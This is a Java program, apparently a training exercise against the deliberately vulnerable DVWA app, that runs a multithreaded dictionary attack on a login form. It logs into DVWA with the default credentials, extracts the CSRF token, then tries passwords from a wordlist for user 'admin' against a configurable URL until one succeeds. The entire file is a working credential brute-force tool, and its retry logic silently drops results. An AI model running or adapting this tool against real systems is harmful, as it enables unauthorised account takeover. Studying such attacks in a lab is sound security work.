package org.letunov;

import okhttp3.*;
import org.apache.commons.lang3.time.StopWatch;

import java.io.BufferedReader;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class Main {
    private static final AtomicBoolean isCracked = new AtomicBoolean(false);
    private static final AtomicInteger tryCount = new AtomicInteger(0);
    private static String BASE_URL;
    private static boolean IS_DVWA = false;


    private static BufferedReader bufferedReader;

    public static void main(String[] args) throws IOException, InterruptedException, URISyntaxException {
        if (args.length == 0) {
            IS_DVWA = true;
            BASE_URL = "http://localhost:4280/vulnerabilities/brute/";
        } else {
            BASE_URL = args[0];
        }

        Path path = Paths.get(Objects.requireNonNull(Main.class.getClassLoader().getResource("passwords.txt")).toURI());
        bufferedReader = Files.newBufferedReader(path);

        System.out.print("Число потоков, которое будет задействовано >> ");
        Scanner scanner = new Scanner(System.in);
        int threadCount = scanner.nextInt();
        List<Thread> threads = new ArrayList<>();
        for (int i = 0; i < threadCount; i++) {
            threads.add(new ThreadTask());
        }
        StopWatch stopWatch = new StopWatch();
        stopWatch.start();
        threads.forEach(Thread::start);
        while (threads.stream().anyMatch(Thread::isAlive)) {
            Thread.sleep(1000);
        }
        stopWatch.stop();
        System.out.printf("Затрачено времени: %s секунд", stopWatch.getTime(TimeUnit.SECONDS));
    }

    private static String getNextPassword() throws IOException {
       return bufferedReader.readLine();
    }


    private static class ThreadTask extends Thread {
        private final OkHttpClient client = new OkHttpClient.Builder()
            .cookieJar(new SimpleCookieJar())
            .build();

        public ThreadTask() throws IOException {
            super();
            if (IS_DVWA) {
                loginToDVWA();
            }
        }

        @Override
        public void run() {
            try {
                String combination;
                while ((combination = getNextPassword()) != null && !isCracked.get()) {
                    System.out.println("Попытка номер " + tryCount.getAndIncrement());
                    if (makeAttemptToLogin(combination)) {
                        isCracked.set(true);
                        System.out.printf("Congratulations! Correct password: %s\n", combination);
                        break;
                    }
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        private boolean makeAttemptToLogin(String password) throws IOException {
            String loginPage = BASE_URL + "?username=admin&password=%s&Login=Login"
                .formatted(password);

            Request loginAttempt = new Request.Builder()
                .url(loginPage)
                .get()
                .build();

            try (Response response = client.newCall(loginAttempt).execute()) {
                assert response.body() != null;
                String html = response.body().string();
                if (html.contains("Username and/or password incorrect.")) {
                    return false;
                } else if (html.contains("Welcome to the password protected area admin")) {
                    return true;
                } else {
                    Thread.sleep(2000);
                    makeAttemptToLogin(password);
                    return false;
                }
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }

        private void loginToDVWA() throws IOException {
            String loginPageUrl = "http://localhost:4280/login.php";
            String username = "admin";
            String password = "password";
            String csrfToken;

            Request loginPageRequest = new Request.Builder()
                .url(loginPageUrl)
                .get().build();

            try (Response response = client.newCall(loginPageRequest).execute()) {
                assert response.body() != null;
                String html = response.body().string();
                String substringForBeginInd = "name='user_token' value='";
                int begInd = html.indexOf(substringForBeginInd);
                int endInd = html.indexOf("' />\r\n\r\n\t</form>");
                csrfToken = html.substring(begInd + substringForBeginInd.length(), endInd);
            }

            RequestBody formBody = new FormBody.Builder()
                .add("username", username)
                .add("password",  password)
                .add("Login", "Login")
                .add("user_token", csrfToken)
                .build();
            Request loginRequest = new Request.Builder()
                .url(loginPageUrl)
                .post(formBody)
                .build();

            try (Response response = client.newCall(loginRequest).execute()) {
                assert response.body() != null;
            }
        }
    }
}

